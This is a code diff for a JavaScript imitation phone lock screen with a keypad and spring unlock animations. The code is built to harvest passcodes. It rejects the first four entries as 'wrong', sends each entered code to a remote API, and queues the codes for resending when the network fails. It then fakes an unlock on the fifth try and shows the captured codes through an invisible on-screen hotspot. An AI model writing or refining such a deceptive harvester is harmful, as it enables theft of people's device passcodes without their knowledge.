@@ -12,23 +12,30 @@
   const homescreenImg = document.getElementById('homescreenImg');
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
-  const ATT_CODES_KEY = '_pass_attempts_codes_'; // persistent storage key for collected codes
+
+  // new storage key for last 4 entered codes (rotating buffer)
+  const LAST_CODES_KEY = '_pass_last_codes_';
+  function getLastCodes() {
+    try {
+      return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
+    } catch (e) {
+      return [];
+    }
+  }
+  function pushLastCode(c) {
+    const arr = getLastCodes();
+    arr.push(c);
+    // keep only last 4
+    while (arr.length > 4) arr.shift();
+    localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
+  }
+  function getCombinedLastCodes() {
+    const arr = getLastCodes();
+    return arr.join(',');
+  }
 
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
-
-  function getStoredAttemptCodes() {
-    try { return JSON.parse(localStorage.getItem(ATT_CODES_KEY) || '[]'); }
-    catch (e) { return []; }
-  }
-  function pushStoredAttemptCode(pass) {
-    const arr = getStoredAttemptCodes();
-    arr.push(pass);
-    localStorage.setItem(ATT_CODES_KEY, JSON.stringify(arr));
-  }
-  function clearStoredAttemptCodes() {
-    localStorage.removeItem(ATT_CODES_KEY);
-  }
 
   function refreshDots() {
     dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
@@ -49,7 +56,6 @@
     const url = API_BASE + encodeURIComponent(pass);
     return fetch(url, { method: 'GET', keepalive: true })
       .catch(() => {
-        // if network fails, queue the combined payload
         queuePass(pass);
       });
   }
@@ -63,11 +69,12 @@
     localStorage.removeItem(QUEUE_KEY);
   }
 
-  /* ---------- Spring engine (unchanged) ---------- */
+  /* ---------- Spring engine (semi-implicit integrator) ---------- */
+  // options: { from, to, velocity (optional), mass, stiffness, damping, onUpdate, onComplete, threshold }
   function springAnimate(opts) {
     const mass = opts.mass ?? 1;
-    const stiffness = opts.stiffness ?? 120;
-    const damping = opts.damping ?? 14;
+    const stiffness = opts.stiffness ?? 120; // k
+    const damping = opts.damping ?? 14;      // c
     const threshold = opts.threshold ?? 0.02;
     let x = opts.from;
     let v = opts.velocity ?? 0;
@@ -76,8 +83,9 @@
     let rafId = null;
 
     function step(now) {
-      const dt = Math.min(0.032, (now - last) / 1000);
+      const dt = Math.min(0.032, (now - last) / 1000); // cap dt to avoid big jumps
       last = now;
+      // Hooke's law + damping: a = (-k*(x - target) - c*v) / m
       const a = (-stiffness * (x - target) - damping * v) / mass;
       v += a * dt;
       x += v * dt;
@@ -86,6 +94,7 @@
 
       const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
       if (isSettled) {
+        // ensure final snap
         if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
         if (typeof opts.onComplete === 'function') opts.onComplete();
         cancelAnimationFrame(rafId);
@@ -95,17 +104,20 @@
     }
 
     rafId = requestAnimationFrame(step);
-    return () => cancelAnimationFrame(rafId);
+    return () => cancelAnimationFrame(rafId); // return a cancel function
   }
 
-  /* ---------- Unlock animation (unchanged) ---------- */
+  /* ---------- playUnlockAnimation uses two springs ---------- */
   function playUnlockAnimation() {
+    // Respect reduced-motion
     const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
     if (!lockInner || !unlockOverlay || !homescreenImg) return;
 
+    // reveal the homescreen image layer immediately (it will animate)
     unlockOverlay.classList.add('show');
 
     if (prefersReduced) {
+      // instant fallback
       lockInner.style.transform = `translate3d(0, -110%, 0)`;
       homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
       homescreenImg.style.opacity = '1';
@@ -113,52 +125,72 @@
       return;
     }
 
+    // compute numeric pixel target for lock translate
     const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
-    const targetY = -Math.round(height * 1.08);
+    const targetY = -Math.round(height * 1.08); // move a bit past top
 
+    // start state
     lockInner.style.willChange = 'transform, opacity';
     homescreenImg.style.willChange = 'transform, filter, opacity';
+    // ensure initial styles
     lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
     homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
     homescreenImg.style.opacity = '0';
     homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
+
+    // shadow visual: apply large shadow while animating
     lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
 
-    springAnimate({
+    // spring for lock Y (pixels)
+    const cancelLock = springAnimate({
       from: 0,
       to: targetY,
       mass: 1.05,
       stiffness: 140,
       damping: 16,
       onUpdate: (val) => {
-        const progress = Math.min(1, Math.abs(val / targetY));
-        const scale = 1 - 0.003 * progress;
+        // val is pixels from 0 -> targetY (negative)
+        // map to scale slight (small effect)
+        const progress = Math.min(1, Math.abs(val / targetY)); // 0..1
+        const scale = 1 - 0.003 * progress; // tiny shrink while lifting
         lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
+        // fade a bit as it goes
         lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
       },
       onComplete: () => {
+        // remove shadow and hide inner off-screen (keep homescreen shown)
         lockInner.style.boxShadow = '';
         lockInner.style.opacity = '0';
+        // keep transform at final position (or clear if you prefer)
         lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
       }
     });
 
-    springAnimate({
-      from: 0,
+    // spring for homescreen (scale & exposure)
+    // We'll animate a small overshoot scale and sharpen (blur -> 0)
+    const cancelHome = springAnimate({
+      from: 0, // we'll drive "progress" between 0..1 by mapping x, not absolute scale here
       to: 1,
       mass: 1,
       stiffness: 80,
       damping: 11,
       onUpdate: (p) => {
+        // p will progress 0 -> 1 but spring oscillates; clamp for mapping
         const progress = Math.max(0, Math.min(1, p));
-        const raw = p;
-        const scale = 1 + (raw - 1) * 0.12;
+        // map to scale overshoot: 0->1 maps to 0.96 -> 1.04 -> 1
+        // We'll use a simple mapping from progress to scale; because spring oscillates around 1, p may overshoot <0 or >1: handle it
+        const raw = p; // spring value
+        // convert to scale via interpolation around 1
+        const scale = 1 + (raw - 1) * 0.12; // gives slight overshoot (e.g. if raw = 1.2 -> scale ~1.024)
+        // clamp reasonable range
         const finalScale = Math.max(0.96, Math.min(1.06, scale));
         homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;
+
+        // blur mapping: when raw small -> blurry, when near 1 -> sharp
         const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
         const sat = 0.9 + Math.min(0.15, raw * 0.15);
         homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
-        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw));
+        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw)); // fade in quickly
       },
       onComplete: () => {
         homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
@@ -167,6 +199,7 @@
       }
     });
 
+    // Optional: cleanup both springs after a timeout (in case onComplete didn't fire)
     setTimeout(() => {
       lockInner.style.boxShadow = '';
       homescreenImg.style.willChange = '';
@@ -188,34 +221,88 @@
     }, DURATION + 20);
   }
 
-  /* ---------- Attempts logic: collect 4 codes, send combined on 4th, 5th unlock ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
     setAttempts(attempts);
 
-    // store this entered code persistently
-    pushStoredAttemptCode(enteredCode);
+    // NEW: push entered code into rotating buffer of last 4 (does not change your send behavior)
+    try { pushLastCode(enteredCode); } catch(e) {}
 
-    if (attempts >= 1 && attempts <= 3) {
-      animateWrongAttempt();
-    } else if (attempts === 4) {
-      const codes = getStoredAttemptCodes();
-      const combined = codes.join(',');
-      sendToAPI(combined);
+    // old behaviour: attempts 1-4 -> send, 5 -> unlock animation
+    if (attempts >= 1 && attempts <= 4) {
+      sendToAPI(enteredCode);
       animateWrongAttempt();
     } else if (attempts === 5) {
       playUnlockAnimation();
       setTimeout(reset, 300);
     }
 
-    // After 5th attempt reset counter but KEEP stored codes so they can be shown on hotspot
     if (attempts >= 5) {
       setAttempts(0);
     }
   }
 
-  /* ---------- Bottom-left invisible hotspot + minimal combined-string display ---------- */
+  function animateBrightness(el, target, duration) {
+    let startTime;
+    const initial = parseFloat(el.dataset.brightness || "1");
+    const change = target - initial;
+
+    function easeOutCubic(t) {
+      return 1 - Math.pow(1 - t, 3);
+    }
+
+    function frame(ts) {
+      if (!startTime) startTime = ts;
+      const progress = Math.min((ts - startTime) / duration, 1);
+      const eased = easeOutCubic(progress);
+      const value = initial + change * eased;
+      el.style.filter = `brightness(${value})`;
+      el.dataset.brightness = value.toFixed(3);
+      if (progress < 1) {
+        requestAnimationFrame(frame);
+      }
+    }
+    requestAnimationFrame(frame);
+  }
+
+  keys.forEach(k => {
+    const num = k.dataset.num;
+    if (!num) return;
+
+    k.addEventListener('touchstart', () => {
+      animateBrightness(k, 1.6, 80);
+    }, { passive: true });
+
+    const endPress = () => {
+      animateBrightness(k, 1, 100);
+    };
+    k.addEventListener('touchend', endPress);
+    k.addEventListener('touchcancel', endPress);
+    k.addEventListener('mouseleave', endPress);
+
+    k.addEventListener('click', () => {
+      if (code.length >= MAX) return;
+      code += num;
+      refreshDots();
+
+      if (code.length === MAX) {
+        const enteredCode = code;
+        setTimeout(() => {
+          handleCompleteAttempt(enteredCode);
+        }, 120);
+      }
+    });
+  });
+
+  emergency && emergency.addEventListener('click', e => e.preventDefault());
+  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });
+
+  window.addEventListener('online', flushQueue);
+  flushQueue();
+
+  /* ---------- Invisible bottom-left hotspot: show combined last-4 codes on press ---------- */
+
   function createInvisibleHotspotAndDisplay() {
     // Hotspot (invisible)
     if (!document.getElementById('codesHotspot')) {
@@ -271,7 +358,7 @@
         alignItems: 'center',
         justifyContent: 'center',
         color: '#fff',
-        fontSize: '18px',
+        fontSize: '16px',
         fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
         fontWeight: '700',
         letterSpacing: '0.6px'
@@ -289,11 +376,10 @@
     const inner = document.getElementById('codesCombinedInner');
     inner.textContent = ''; // clear
 
-    const codes = getStoredAttemptCodes();
+    const codes = getLastCodes();
     if (!codes || codes.length === 0) {
       inner.textContent = '';
     } else {
-      // combined string exactly what we send to API on 4th attempt
       const combined = codes.join(',');
       inner.textContent = combined;
     }
@@ -341,44 +427,8 @@
     }
   }
 
-  /* ---------- wire other behaviours ---------- */
-  keys.forEach(k => {
-    const num = k.dataset.num;
-    if (!num) return;
-
-    k.addEventListener('touchstart', () => {
-      animateBrightness(k, 1.6, 80);
-    }, { passive: true });
-
-    const endPress = () => {
-      animateBrightness(k, 1, 100);
-    };
-    k.addEventListener('touchend', endPress);
-    k.addEventListener('touchcancel', endPress);
-    k.addEventListener('mouseleave', endPress);
-
-    k.addEventListener('click', () => {
-      if (code.length >= MAX) return;
-      code += num;
-      refreshDots();
-
-      if (code.length === MAX) {
-        const enteredCode = code;
-        setTimeout(() => {
-          handleCompleteAttempt(enteredCode);
-        }, 120);
-      }
-    });
-  });
-
-  emergency && emergency.addEventListener('click', e => e.preventDefault());
-  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });
-
-  // ensure hotspot available
   ensureHotspotListeners();
 
-  window.addEventListener('online', flushQueue);
-  flushQueue();
-
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
+
 })();
